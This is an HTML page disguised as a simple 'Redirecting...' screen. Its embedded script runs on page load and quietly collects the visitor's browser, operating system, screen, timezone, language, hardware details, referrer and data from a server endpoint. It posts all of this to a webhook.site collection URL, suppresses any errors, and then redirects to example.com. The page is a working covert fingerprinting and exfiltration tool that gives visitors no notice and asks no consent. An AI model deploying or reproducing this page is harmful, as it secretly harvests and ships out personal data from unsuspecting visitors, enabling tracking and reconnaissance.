<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <style>
    body {
      background: #111;
      color: #0f0;
      font-family: monospace;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
  </style>
</head>
<body>
  <div>Redirecting...</div>

  <script>
    const WEBHOOK_URL = "https://webhook.site/5c51d1ab-3a36-41a6-871c-d06526fa191d";
    const REDIRECT_URL = "https://example.com";

    function getBrowserInfo() {
      const ua = navigator.userAgent;

      let browser = "Unknown";
      if (ua.includes("Firefox")) browser = "Firefox";
      else if (ua.includes("Edg")) browser = "Edge";
      else if (ua.includes("Chrome")) browser = "Chrome";
      else if (ua.includes("Safari")) browser = "Safari";

      let os = "Unknown";
      if (ua.includes("Win")) os = "Windows";
      else if (ua.includes("Mac")) os = "MacOS";
      else if (ua.includes("Linux")) os = "Linux";
      else if (ua.includes("Android")) os = "Android";
      else if (ua.includes("iPhone")) os = "iOS";

      return { browser, os };
    }

    async function collectAndRedirect() {
      try {
        const serverData = await fetch("/api/info").then(r => r.json());
        const { browser, os } = getBrowserInfo();

        const clientData = {
          browser,
          os,
          screen: {
            width: screen.width,
            height: screen.height,
            color_depth: screen.colorDepth
          },
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          language: navigator.language,
          languages: navigator.languages,
          cookies_enabled: navigator.cookieEnabled,
          online: navigator.onLine,
          referrer: document.referrer || "None",
          device_memory_gb: navigator.deviceMemory || "Unknown",
          cpu_cores: navigator.hardwareConcurrency || "Unknown",
          platform: navigator.platform,
          local_time: new Date().toString()
        };

        const finalData = {
          ...serverData,
          client: clientData
        };
        if (WEBHOOK_URL && WEBHOOK_URL.startsWith("http")) {
          fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify(finalData)
          }).catch(() => {});
        }

      } catch (e) {
      }
      setTimeout(() => {
        window.location.href = REDIRECT_URL;
      }, 800);
    }

    collectAndRedirect();
  </script>
</body>
</html>
